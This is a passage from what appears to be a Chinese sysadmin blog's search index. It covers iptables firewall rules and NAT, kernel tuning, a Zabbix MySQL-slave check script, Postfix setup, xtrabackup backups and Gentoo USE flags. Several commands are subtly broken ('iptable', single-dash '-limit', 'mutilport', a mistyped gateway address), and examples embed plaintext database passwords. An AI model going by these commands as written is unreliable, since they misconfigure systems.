--icmp-type 8 -j DROPoutput链： 禁止icmp-type 0 iptables -A OUTPUT -o eth0 -p icmp --icmp-type 0 -j DROP 简化配置：iptables -A INPUT -i eth0 -p icmp -m icmp --icmp-type any -j DROP注:使用-m 调用icmp模块 状态机制配置1234567New状态机制的包：说明这是三次握手第一次发出的SYN包ESTABLISHED状态机制的包: 一方数据发送(SYN)另一方正常应答，双向保持连接(SYN&#x2F;ACK)，此时状态就是ESTABLISHED的状态了RELATED(有关系的)状态机制的包：一个新的连接想要是RELATED状态,首先要有一个ESTABLISHED状态一直存活。有了RELATED状态,ICMP&#x2F;FTP传输才能穿过防火墙正常工作。INVALID(无效的)：说明数据包不能被识别属于哪个连接或没有任何状态。一般我们会DROP掉这个状态数据包,因为防火墙认为这是不安全的状态 配置 123防火墙服务配置在FTP服务器上时，需要配置以下策略iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPTiptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables对网络数据传输进行限速 1原理图如上，它是基于逻辑上的令牌桶实现 配置 123456789101112iptables -A INPUT -s 10.0.0.253 -p icmp --icmp-type 8 -m limit --limit 6&#x2F;min --limit-burst 5 -j ACCEPTiptables -A INPUT -s 10.0.0.253 -p icmp --icmp-type 8 -j DROP上面两条命令意思为：即,先允许5个ping包通过,然后ping继承第2条drop规则(超时)，然后每10秒再次给予一个令牌(可以再ping 一个包)，如果一分钟内令牌没被使用(没ping),令牌依然存在,此时可以再ping 5个包，然后再等待10秒再获取一个令牌参数：--limit n&#x2F;&#123;second&#x2F;minute&#x2F;hour&#125;: 解释：指定时间内的请求速率”n”为速率，后面为时间分别为：秒 分 时--limit-burst [n]解释：在同一时间内允许通过的请求”n”为数字(单位包比特)，不指定默认为5注：生产环境需要对数据包进行计算,如限速5M等于多少包比特 iptables安全配置基本配置 12345678910111213141516&#x2F;etc&#x2F;sysconfig&#x2F;iptables #初始化保存配置文件初始化操作配置iptables -F 清除所有规则，不会处理默认的规则iptables -X 清除用户自定义的链iptables -Z 清除链的计数器清零（数据包计数器与数据包字节计数器）iptables -nL -v 显示计数器信息iptables -A INPUT -s 10.0.0.0&#x2F;24 -i eth1 -p tcp --dport 22 -j ACCEPT 先把自己允许(别限制太细)iptables -A INPUT -i lo -j ACCEPT 允许自己ping自己iptables -A INPUT -s 10.0.0.0&#x2F;8 -j ACCEPT 允许内网访问进来iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 允许安全状态机制iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 允许安全状态机制iptables -P INPUT DROP 进来的数据包配置默认拒绝iptables -P FORWARD DROP 进来的FORWARD配置默认拒绝iptables -P OUTPUT ACCEPT 出去的数据包配置默认允许 业务配置 123iptables -A INPUT -p tcp -m multiport --dport 80,443 -j ACCEPT #开放80和443 Web端口iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP #公网禁止Pingiptables -A INPUT -s 172.16.1.0&#x2F;24 -j ACCEPT # 允许访问的原地址网段 防火墙规则永久保存1方法1：&#x2F;etc&#x2F;init.d&#x2F;iptables save 永久保存 12方法2： iptables-save #查看当前规则iptables-save &gt; &#x2F;etc&#x2F;sysconfig&#x2F;iptables #保存规则 1方法3： 放到脚本中,然后crontab定时加载一次。或者开启自加载 此时再重启iptables服务配置就不会丢失了 iptables线上配置规范1234在测试环境测试OK后，再在线上机器配置注：iptables -A INPUT ......iptables开头的命令配置完毕后是即时生效的 而vim &#x2F;etc&#x2F;sysconfig&#x2F;iptables配置文件中修改后需要重启才能生效 SNAT共享上网12345环境说明：(iptables)主机1: eth0:IP:10.0.0.8(公网IP) eth1:IP:172.16.1.50主机2: eth1 - IP:172.16.1.51 以下配置均在防火墙上配置 1234#iptables上开启内核转发vim &#x2F;etc&#x2F;sysctl.confnet.ipv4.ip_forward &#x3D; 1sysctl -p 123iptables配置内网172.16.1.51主机NATiptables -t nat -A POSTROUTING -s 172.16.1.51 -o eth0 -j SNAT --to-source 10.0.0.8注：这里10.0.0.8是iptables上的公网IP 12最后，在172.16.1.51服务器上配置网关为172.16.1.50或配置如下路由ip route 0.0.0.0 0.0.0.0 172.15.1.50 故障排查 12345678910111213内网机ping外网测试,如果Ping不通,则按照包转发流程排查iptables -nL -viptables -A FORWARD -o eth0 -s 172.16.1.0&#x2F;24 -j ACCEPT #对172.16.1.0&#x2F;24网段出口转发iptables -A FORWARD -i eth1 -d 172.16.1.0&#x2F;24 -j ACCEPT #对172.16.1.0&#x2F;24网段启用进来转发注：如果配置了默认FORWARD策略为DROP，则需要配置以上两条FORWARD规则注：172.16.1.51是局域网IP地址(非iptables主机) -o 表示出去的网口 -i 表示进来的网口 -s 指定源地址 -d 指定目的地址 如果没有固定外网IP地址,可以使用以下NAT伪装命令 1iptables -t nat -A POSTROUTING -s 172.16.1.0&#x2F;24 -o eth0 -j MASQUERADE DNAT端口映射12访问我本机的10.0.0.8(公网IP)的9000端口，映射到172.16.1.51的22端口iptables -t nat -A PREROUTING -d 10.0.0.8 -p tcp --dport 9000 -i eth0 -j DNAT --to-destination 172.16.1.51:22 ####DNAT一对一映射 1234iptables项目案例3：IP一对一映射 172.16.1.10 &#x3D;&#x3D; 10.0.0.8(公网)iptables -t nat -I PREROUTING -d 10.0.0.8 -j DNAT --to-destination 172.16.1.10iptables -t nat -I POSTROUTING -s 172.16.1.51 -o eth0 -j SNAT --to-source 10.0.0.8 映射多个外网IP上网123456789方法1： iptables -t nat -A POSTROUTING -s 10.0.1.0&#x2F;255.255.240.0 -o eth0 -j SNAT --to-source 124.42.60.11-124.42.60.16三层交换机或路由器，划分VLAN。 方法2：iptables -t nat -A POSTROUTING -s 10.0.1.0&#x2F;22 -o eth0 -j SNAT --to-source 124.42.60.11iptables -t nat -A POSTROUTING -s 10.0.2.0&#x2F;22 -o eth0 -j SNAT --to-source 124.42.60.12扩大子网，增加广播风暴。 iptables自定义链123与shell变量定义类似，目的是方便使用RETURN意思是当此策略不匹配时，继续执行下面的一条命令 123456789#说明:创建名字为syn-flood自定义链iptables -N syn-flood #定义自定义链的值(syn并发超过200个就每秒限制5000个包,不匹配就执行下一条规则)iptables -A syn-flood -m limit -limit 5000&#x2F;s -limit-burst 200 -j RETURN iptables -A syn-flood -j DROP #应用名字为syn-flood的规则iptables -A INPUT -i eth0 -syn -j syn-flood 自定义链测试 123456789101112131415161718需求：对多个网段数据包进行丢弃iptable -A INPUT -s 10.0.0.0&#x2F;24 -p tcp --dport 22 -j DROPiptable -A INPUT -s 11.0.0.0&#x2F;24 -p tcp --dport 22 -j DROPiptable -A INPUT -s 12.0.0.0&#x2F;24 -p tcp --dport 22 -j DROPiptable -A INPUT -s 13.0.0.0&#x2F;24 -p tcp --dport 22 -j DROP上面太繁琐，使用自定义链配置如下：iptable -N IPNETiptable -A IPNET -p tcp --dport 22 -j DROP 调用自定义链iptable -A INPUT -s 10.0.0.0&#x2F;24 -j IPNETiptable -A INPUT -s 11.0.0.0&#x2F;24 -j IPNETiptable -A INPUT -s 12.0.0.0&#x2F;24 -j IPNETiptable -A INPUT -s 13.0.0.0&#x2F;24 -j IPNET如果后期需要变更的时候，只需要修改自定义链的配置即可，举例如下：iptable -R IPNET 1 -p tcp -m mutilport --dport 22,23 -j DROP iptables优化12345678910111213141516171819202122232425262728系统防火墙与网络内核优化标准参数有关iptables的内核优化调整内核参数文件&#x2F;etc&#x2F;sysctl.conf以下是我的生产环境的某个服务器的配置：------------解决time-wait过多-------------net.ipv4.tcp_fin_timeout &#x3D; 2net.ipv4.tcp_tw_reuse &#x3D; 1net.ipv4.tcp_tw_recycle &#x3D; 1net.ipv4.tcp_syncookies &#x3D; 1net.ipv4.tcp_keepalive_time &#x3D; 600net.ipv4.tcp_max_tw_buckets &#x3D; 36000----------------------------------net.ipv4.ip_local_port_range &#x3D; 4000 65000net.ipv4.tcp_max_syn_backlog &#x3D; 16384net.ipv4.route.gc_timeout &#x3D; 100net.ipv4.tcp_syn_retries &#x3D; 1net.ipv4.tcp_synack_retries &#x3D; 1----------------------------------#dmesg里面显示 ip_conntrack: table full, dropping packet.的错误提示，什么原因？如何解决？#iptables优化net.nf_conntrack_max &#x3D; 25000000net.netfilter.nf_conntrack_max &#x3D; 25000000net.netfilter.nf_conntrack_tcp_timeout_established &#x3D; 180net.netfilter.nf_conntrack_tcp_timeout_time_wait &#x3D; 120net.netfilter.nf_conntrack_tcp_timeout_close_wait &#x3D; 60net.netfilter.nf_conntrack_tcp_timeout_fin_wait &#x3D; 120","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"iptables","slug":"iptables","permalink":"https://garywu520.github.io/tags/iptables/"},{"name":"防火墙","slug":"防火墙","permalink":"https://garywu520.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"zabbix自定义key监控mysql主从","slug":"zabbix自定义key监控mysql主从","date":"2018-02-09T07:06:08.000Z","updated":"2018-02-13T05:27:46.156Z","comments":true,"path":"2018/02/09/zabbix自定义key监控mysql主从/","link":"","permalink":"https://garywu520.github.io/2018/02/09/zabbix%E8%87%AA%E5%AE%9A%E4%B9%89key%E7%9B%91%E6%8E%A7mysql%E4%B8%BB%E4%BB%8E/","excerpt":"1以下通过自定义脚本对mysql主从存活状态以及io和sql线程进行监控","text":"1以下通过自定义脚本对mysql主从存活状态以及io和sql线程进行监控 步骤1：创建脚本存放目录并使用脚本 1234mkdir -p &#x2F;var&#x2F;lib&#x2F;zabbix&#x2F;scripts&#x2F;mysql在此目录使用以下脚本并赋予执行权限注：以下脚本会生成3个文件 1234567891011121314151617181920212223#!&#x2F;bin&#x2F;bashUSER&#x3D;rootPASS&#x3D;io_check&#x3D;&#96;cat mysql_slave_status.log |awk &quot;NR&#x3D;&#x3D;1&quot;|awk &#39;&#123;print $2&#125;&#39;&#96;sql_check&#x3D;&#96;cat mysql_slave_status.log |awk &quot;NR&#x3D;&#x3D;2&quot;|awk &#39;&#123;print $2&#125;&#39;&#96;mysql -u$&#123;USER&#125; -p$&#123;PASS&#125; -e &quot;show slave status\\G;&quot; |grep -i running &gt; mysql_slave_status.log#IO线程判断if [ &quot;$&#123;io_check&#125;&quot; &#x3D; &quot;Yes&quot; ];then echo &quot;1&quot; &gt; io_check.logelse echo &quot;0&quot; &gt; io_check.logfi#sql线程判断if [ &quot;$&#123;sql_check&#125;&quot; &#x3D; &quot;Yes&quot; ];then echo &quot;1&quot; &gt; sql_check.logelse echo &quot;0&quot; &gt; sql_check.logfi 步骤2：配置crontab 12#mysql slave自定义key*&#x2F;1 * * * * &#x2F;bin&#x2F;sh &#x2F;var&#x2F;lib&#x2F;zabbix&#x2F;scripts&#x2F;mysql&#x2F;slave_mysql.sh 步骤3: zabbix agentd.conf 添加自定义key, 如下： 12345678UnsafeUserParameters&#x3D;1 #启用自定义key#mysql slave监控UserParameter&#x3D;io.slave,cat &#x2F;var&#x2F;lib&#x2F;zabbix&#x2F;scripts&#x2F;mysql&#x2F;io_check.logUserParameter&#x3D;sql.slave,cat &#x2F;var&#x2F;lib&#x2F;zabbix&#x2F;scripts&#x2F;mysql&#x2F;sql_check.log#mysqlUserParameter&#x3D;mysql.stat,ss -lntup|grep 3306|wc -l 步骤4：重启zabbix agent 步骤5：zabbix Web界面主机添加时，选择创建好的mysql模板即可 最后等待监控取值正常即可, 正常值为1","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"slave","slug":"slave","permalink":"https://garywu520.github.io/tags/slave/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"}]},{"title":"postfix邮件发送服务器","slug":"postfix邮件发送服务器","date":"2018-02-09T03:51:27.000Z","updated":"2018-06-13T10:36:12.043Z","comments":true,"path":"2018/02/09/postfix邮件发送服务器/","link":"","permalink":"https://garywu520.github.io/2018/02/09/postfix%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"1Postfix是用来替代Sendmail的，它的配置文件比Sendmail简单得多，配置相当容易。适合当做告警邮件发送服务器","text":"1Postfix是用来替代Sendmail的，它的配置文件比Sendmail简单得多，配置相当容易。适合当做告警邮件发送服务器 12yum remove -y sendmailyum install -y postfix 主配置文件修改 /etc/postfix/main.cf 1234567myhostname &#x3D; mail.example.com #改为自己想定义的域名mydomain &#x3D; example.com #改为根域inet_interfaces &#x3D; all #默认只监听localhost,需要改为all向外发信relay_domains &#x3D; $mydomainmyorigin &#x3D; $mydomainmydestination &#x3D; $mydomain 123chkconfig --add postfixchkconfig postfix on&#x2F;etc&#x2F;init.d&#x2F;postfix start 测试发信 12345mail -s &quot;邮件标题&quot; user@sohu.com &lt; content.txt 或echo &quot;邮件正文&quot; | mail -s &quot;邮件标题&quot; user@sohu.com注：其中user@sohu.com是收件人地址，content.txt里面是邮件正文 自定义定义发信人等配置 1234567修改&#x2F;etc&#x2F;mail.rc (或&#x2F;etc&#x2F;nail.rc),添加如下内容：set from&#x3D;$HOSTNAME@domain.com 说明：from是定义发送的邮件地址配置成功后，重启postfix服务，就可以发信测试了","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"postfix","slug":"postfix","permalink":"https://garywu520.github.io/tags/postfix/"},{"name":"mail","slug":"mail","permalink":"https://garywu520.github.io/tags/mail/"},{"name":"mailx","slug":"mailx","permalink":"https://garywu520.github.io/tags/mailx/"},{"name":"sendmail","slug":"sendmail","permalink":"https://garywu520.github.io/tags/sendmail/"}]},{"title":"xtrabackup连接不上MySQL的问题","slug":"xtrabackup连接不上MySQL的问题","date":"2018-02-08T07:28:51.000Z","updated":"2018-02-08T08:41:28.376Z","comments":true,"path":"2018/02/08/xtrabackup连接不上MySQL的问题/","link":"","permalink":"https://garywu520.github.io/2018/02/08/xtrabackup%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8AMySQL%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"使用xtrabackup备份问题","text":"使用xtrabackup备份问题 12345678910[root@localhost ~]# innobackupex --user&#x3D;root --password&#x3D;131417 &#x2F;backup以下是错误提示：innobackupex: got a fatal error with the following stacktrace: at &#x2F;usr&#x2F;bin&#x2F;innobackupex line 3011.main::mysql_connect(&#39;abort_on_error&#39;, 1) called at &#x2F;usr&#x2F;bin&#x2F;innobackupex line 1551innobackupex: Error: Failed to connect to MySQL server: DBI connect(&#39;;mysql_read_default_group&#x3D;xtrabackup&#39;,&#39;root&#39;,...) failed: Can&#39;t connect to local MySQL server through socket &#39;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock&#39; (2) at &#x2F;usr&#x2F;bin&#x2F;innobackupex line 2995.150712 22:29:59 innobackupex: Connecting to MySQL server with DSN &#39;dbi:mysql:;mysql_read_default_group&#x3D;xtrabackup&#39; as &#39;root&#39; (using password: YES).innobackupex: got a fatal error with the following stacktrace: at &#x2F;usr&#x2F;bin&#x2F;innobackupex line 3011.main::mysql_connect(&#39;abort_on_error&#39;, 1) called at &#x2F;usr&#x2F;bin&#x2F;innobackupex line 1570innobackupex: Error: Failed to connect to MySQL server: DBI connect(&#39;;mysql_read_default_group&#x3D;xtrabackup&#39;,&#39;root&#39;,...) failed: Can&#39;t connect to local MySQL server through socket &#39;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock&#39; (2) at &#x2F;usr&#x2F;bin&#x2F;innobackupex line 2995. 解决方法： 123innobackupex是通过socket的方式链接上去的。想办法使它不走socket就可以了。innobackupex --user&#x3D;root --password&#x3D;131417 --host&#x3D;127.0.0.1 &#x2F;backup 我的备份全库并压缩命令 1innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --password&#x3D;数据库密码 --host&#x3D;127.0.0.1 \\ --stream&#x3D;xbstream &#x2F;data&#x2F;A&#x2F;mysql&#x2F;Allbackup | gzip &gt; &#x2F;data&#x2F;A&#x2F;mysql&#x2F;Allbackup.tar.gz","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"innobackupex","slug":"innobackupex","permalink":"https://garywu520.github.io/tags/innobackupex/"},{"name":"xtrabackup","slug":"xtrabackup","permalink":"https://garywu520.github.io/tags/xtrabackup/"}]},{"title":"查询MySQL表占用空间空间排序","slug":"查询MySQL占用空间空间排序","date":"2018-02-08T06:39:27.000Z","updated":"2018-02-08T06:48:26.413Z","comments":true,"path":"2018/02/08/查询MySQL占用空间空间排序/","link":"","permalink":"https://garywu520.github.io/2018/02/08/%E6%9F%A5%E8%AF%A2MySQL%E5%8D%A0%E7%94%A8%E7%A9%BA%E9%97%B4%E7%A9%BA%E9%97%B4%E6%8E%92%E5%BA%8F/","excerpt":"1一个数据库运行了很久，向对其进行清理优化，如何能快速知道哪些表占用容量较大呢？","text":"1一个数据库运行了很久，向对其进行清理优化，如何能快速知道哪些表占用容量较大呢？ 12345678910Select Concat(table_schema, &#39;.&#39;, table_name) As &quot;Name&quot; ,Concat(Round(table_rows &#x2F; 1000000, 2), &#39;M&#39;) As &quot;Rows&quot; ,Concat(Round(data_length &#x2F; ( 1024 * 1024 ), 2), &#39;M&#39;) As &quot;Row Size&quot; ,Concat(Round(index_length &#x2F; ( 1024 * 1024 ), 2), &#39;M&#39;) As &quot;Index Size&quot; ,Concat(Round(( data_length + index_length ) &#x2F; ( 1024 * 1024 ), 2), &#39;M&#39;) As &quot;Total&quot; ,Round(index_length &#x2F; data_length, 2) &quot;Row &#x2F; Index Ratio&quot; From information_schema.TABLES Order By data_length + index_length DESC Limit 20; 1其中Limit 20是查看前20名占用空间较大的表，效果如下： 12345678910111213141516171819202122232425+------------------------------------------------+---------+------------+------------+------------+-------------------+| Name | Rows | Row Size | Index Size | Total | Row &#x2F; Index Ratio |+------------------------------------------------+---------+------------+------------+------------+-------------------+| mcmp_event_l.event_launcher_attribute_daily | 992.65M | 132980.50M | 171929.17M | 304909.67M | 1.29 || mcmp_event_v.event_vlock_attribute_daily | 277.90M | 39546.03M | 44269.23M | 83815.27M | 1.12 || mcmp_launcher.theme_thid_summary_daily | 259.76M | 27497.39M | 16808.81M | 44306.20M | 0.61 || mcmp_launcher.theme_new_thid_summary_daily | 282.85M | 26321.91M | 17841.27M | 44163.17M | 0.68 || mcmp_event_l.event_launcher_ver_daily | 150.33M | 15974.84M | 27352.84M | 43327.69M | 1.71 || mcmp_crash.exc_vlock_exception_model_osver | 0.79M | 22076.00M | 0.00M | 22076.00M | 0.00 || mcmp_launcher.theme_new_thid_summary_daily_sum | 234.67M | 17412.17M | 3534.38M | 20946.55M | 0.20 || mcmp_event_v.event_vlock_ver_daily | 51.24M | 5931.20M | 10507.33M | 16438.53M | 1.77 || mcmp_event_v.event_vlock_ver_daily_copy | 50.06M | 5684.45M | 10077.70M | 15762.16M | 1.77 || mcmp_crash.exc_launcher_exception_model_osver | 3.76M | 11865.00M | 0.00M | 11865.00M | 0.00 || mcmp_event_l.event_launcher_attribute_su_daily | 41.70M | 8022.86M | 3096.13M | 11118.98M | 0.39 || mcmp_event_v.event_vlock_attribute_su_daily | 27.02M | 5434.39M | 1335.61M | 6770.00M | 0.25 || mcmp_launcher.launcher_device_dru_daily_imei | 48.46M | 4165.00M | 0.00M | 4165.00M | 0.00 || mcmp_support.support_mail_history | 0.01M | 2571.52M | 0.00M | 2571.52M | 0.00 || columbus_monitor.monitor_mail_history | 0.01M | 2314.52M | 0.00M | 2314.52M | 0.00 || mobile_interface.mobile_info | 5.12M | 1702.00M | 0.00M | 1702.00M | 0.00 || mcmp_f_manager.f_manager_aa_name_addr_pv_daily | 14.20M | 1251.00M | 0.00M | 1251.00M | 0.00 || columbus_monitor.compass_flow | 0.02M | 1064.10M | 0.00M | 1064.10M | 0.00 || mcmp_crash.exc_launcher_exception_core_daily | 5.77M | 440.00M | 380.00M | 820.00M | 0.86 || mcmp_launcher.launcher_channel_ver_daily | 3.02M | 501.95M | 306.06M | 808.02M | 0.61 |+------------------------------------------------+---------+------------+------------+------------+-------------------+20 rows in set (0.95 sec)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"}]},{"title":"xtrabackup单表备份与还原","slug":"xtrabackup单表备份与还原","date":"2018-02-08T05:22:37.000Z","updated":"2018-02-08T05:33:09.388Z","comments":true,"path":"2018/02/08/xtrabackup单表备份与还原/","link":"","permalink":"https://garywu520.github.io/2018/02/08/xtrabackup%E5%8D%95%E8%A1%A8%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/","excerpt":"单表备份 使用–include方式","text":"单表备份 使用–include方式 12345678例：备份oss库中以store开头的表和pms库中以sys_right开头的表注意2个匹配条件中必须以|分隔 #innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --password&#x3D;admin --include&#x3D;&#39;oss.store.*|pms.sys_right.*&#39; --slave-info &#x2F;root&#x2F;test_dir&#x2F; 备份pms库和test库#innobackupex --user&#x3D;root --password&#x3D;admin@mysql_motone --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --include&#x3D;&#39;test.*|pms.*&#39; --slave-info &#x2F;root&#x2F;test_dir&#x2F; 使用–tables-file方式 注：本方法不能使用正则，要明确要备份的是哪个库哪个表 123456789备份oss库下的store_app和pms库下的sys_right 首先创建备份的文件列表，一行一条# cat file.txt oss.storepms.sys_right 然后再备份#innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --password&#x3D;admin --tables-file&#x3D;&#x2F;root&#x2F;file.txt --slave-info &#x2F;root&#x2F;test_dir&#x2F; 123456789101112131415161718192021222324252627（1）停止数据库服务 &#x2F;etc&#x2F;init.d&#x2F;mysqld stop （2）整理(preparing)部分备份 innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --password&#x3D;123456 --apply-log --export &#x2F;root&#x2F;test_dir&#x2F;2013-01-04_15-08-06&#x2F; （3）将备份文件拷贝回数据目录\\cp -rf &#x2F;root&#x2F;test_dir&#x2F;2013-01-04_15-08-06&#x2F;* &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F; （4）赋权chown -R mysql:mysql &#x2F;usr&#x2F;local&#x2F;mysql （5）启动数据库&#x2F;etc&#x2F;init.d&#x2F;mysqld start(6) 验证mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema | | mysql | | mysqlslap | | oss | | pms | +--------------------+5 rows in set (0.00 sec)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"innobackupex","slug":"innobackupex","permalink":"https://garywu520.github.io/tags/innobackupex/"},{"name":"xtrabackup","slug":"xtrabackup","permalink":"https://garywu520.github.io/tags/xtrabackup/"}]},{"title":"深入理解zabbix权限及业务分类告警","slug":"深入理解zabbix权限及业务分类告警","date":"2018-02-08T03:45:34.000Z","updated":"2018-02-08T06:38:25.014Z","comments":true,"path":"2018/02/08/深入理解zabbix权限及业务分类告警/","link":"","permalink":"https://garywu520.github.io/2018/02/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3zabbix%E6%9D%83%E9%99%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%88%86%E7%B1%BB%E5%91%8A%E8%AD%A6/","excerpt":"1以下是工作中对zabbix用户、用户组、主机、主机组以及动作的一些理解，并根据业务需求，对业务进行分类监控","text":"1以下是工作中对zabbix用户、用户组、主机、主机组以及动作的一些理解，并根据业务需求，对业务进行分类监控 12345678用户： 谁有权限登陆zabbix用户群组: 用户可根据业务分类，让不同用户隶属于不同的用户群组（可配置业务主机zabbix登陆后访问权限）主机: 添加的主机(主机添加时选择主机群组)主机群组: 主机群组是主机的集合。可根据业务划分,让不同业务主机隶属于不同的主机群组动作: 而动作配置可将主机群组与用户群组进行联系起来，即配置哪个业务主机群组（中的任一主机）当出现问题后(条件)，发送告警邮件给对应的用户群组(操作)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"}]},{"title":"emerge USE标记介绍-gentoo","slug":"emerge-USE标记介绍-gentoo","date":"2018-02-06T12:31:26.000Z","updated":"2018-02-06T13:11:08.196Z","comments":true,"path":"2018/02/06/emerge-USE标记介绍-gentoo/","link":"","permalink":"https://garywu520.github.io/2018/02/06/emerge-USE%E6%A0%87%E8%AE%B0%E4%BB%8B%E7%BB%8D-gentoo/","excerpt":"Gentoo/Funtoo USE标记 12安装软件时，避免不了一些依赖。那么就需要了解USE标记。USE的简单理解如下：一个软件不只包含软件本身，还包括其组件，如，文档，插件，GUI支持等。USE就是用来标记是否要安装软件的同时安装这些组件。","text":"Gentoo/Funtoo USE标记 12安装软件时，避免不了一些依赖。那么就需要了解USE标记。USE的简单理解如下：一个软件不只包含软件本身，还包括其组件，如，文档，插件，GUI支持等。USE就是用来标记是否要安装软件的同时安装这些组件。 默认USE标记 1所有USE标志都声明在 USE 变量里面。为了让用户能方便地查找和选择USE标志，官方提供了一份默认的USE设定。这些设定是Gentoo用户通常都要用到的USE标志的集合。这个默认设置在make.defaults 文件中 查看当前正在使用的全部USE标记 1root #emerge --info | grep ^USE 声明全局USE标记 12通过在&#x2F;etc&#x2F;portage&#x2F;make.conf里定义USE全局变量。在这个变量里，添加你需要的额外USE标志，或者移除你不需要的USE标志。后者可通过在标记前面加个负号&quot;-&quot; 前缀来实现。 例如： 123456cat &#x2F;etc&#x2F;portage&#x2F;make.confUSE&#x3D;&quot;$USE -ipv6&quot;USE&#x3D;&quot;$USE -X -opengl -alsa -esd -kde -qt -gnome -gtk -gtk2&quot;USE&#x3D;&quot;$USE acpi hal dbus&quot;USE&#x3D;&quot;$USE -ldap snmp vim-syntax threads&quot; 为单个软件包声明USE标记 12345678910通过在&#x2F;etc&#x2F;portage&#x2F;package.use 目录中来声明单个软件包USE标记如：&#x3D;dev-ruby&#x2F;rdoc-4.0.1-r1 ruby_targets_ruby20# required by dev-ruby&#x2F;rdoc-4.0.1-r1[ruby_targets_ruby20]# required by dev-lang&#x2F;ruby-2.0.0_p598[rdoc]# required by dev-ruby&#x2F;racc-1.4.9[ruby_targets_ruby20]&#x3D;dev-ruby&#x2F;json-1.8.0 ruby_targets_ruby20......当前可用的局部USE标记可以在网上或本机的&#x2F;usr&#x2F;portage&#x2F;profiles&#x2F;use.local.desc文件中查询到 声明临时USE标记 12仅仅把USE变量声明成一个环境变量设定临时USE。比如，在安装 xxx 的时候不要装 jj 就声明：USE ＝ &quot;-jj&quot; emerge xxx USE标记优先级 12345优先级由低到高,排序如下：(1)make.defaults 里面的USE默认设定(2)用户在&#x2F;etc&#x2F;portage&#x2F;make.conf里面的USE默认设定(3)用户在 &#x2F;etc&#x2F;portage&#x2F;package.use里面的USE默认设定(4)用户作为环境变量的USE设定 USE标记颜色含义 123456emerge命令显示时，不同颜色USE标记的意义:红色: 表示这次emerge用到的USE标记黄色: 表示从上次更新后该标记被增加、删除或者Masked蓝色: 前面带-表示这次emerge屏蔽掉的USE标记绿色: 表示你本次编译添加的新USE标记，或者去掉的USE标记。 Emerge常用命令 12345678910111213emerge eix #使用eix命令来查看软件包依赖eix supervisor #查看安装包具体全称、可用软件版本、软件来源等信息emerge -s supervisor #查询软件包名称、版本、包大小等信息emerge -pv supervisor #查看依赖包的USE标记,并根据以上提示进行添加emerge app-admin&#x2F;supervisor #安装emerge -C &quot;软件名称&quot; #卸载(不影响功能的)软件emerge --version #查看emerge版本信息 参考: ​ Gentoo 官方Wiki ​","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Gentoo","slug":"Gentoo","permalink":"https://garywu520.github.io/tags/Gentoo/"},{"name":"Funtoo","slug":"Funtoo","permalink":"https://garywu520.github.io/tags/Funtoo/"},{"name":"emerge","slug":"emerge","permalink":"https://garywu520.github.io/tags/emerge/"},{"name":"USE标记","slug":"USE标记","permalink":"https://garywu520.github.io/tags/USE%E6%A0%87%E8%AE%B0/"},{"name":"emerge命令","slug":"emerge命令","permalink":"https://garywu520.github.io/tags/emerge%E5%91%BD%E4%BB%A4/"}]},{"title":"supervisor安装与管理-Gentoo","slug":"supervisor安装与管理-Gentoo","date":"2018-02-06T11:48:18.000Z","updated":"2018-06-20T10:27:37.832Z","comments":true,"path":"2018/02/06/supervisor安装与管理-Gentoo/","link":"","permalink":"https://garywu520.github.io/2018/02/06/supervisor%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%A1%E7%90%86-Gentoo/","excerpt":"1Supervisor 相当强大，提供了很丰富的功能，不过我们可能只需要用到其中一小部分。安装完成之后，可以编写配置文件，来满足自己的需求。","text":"1Supervisor 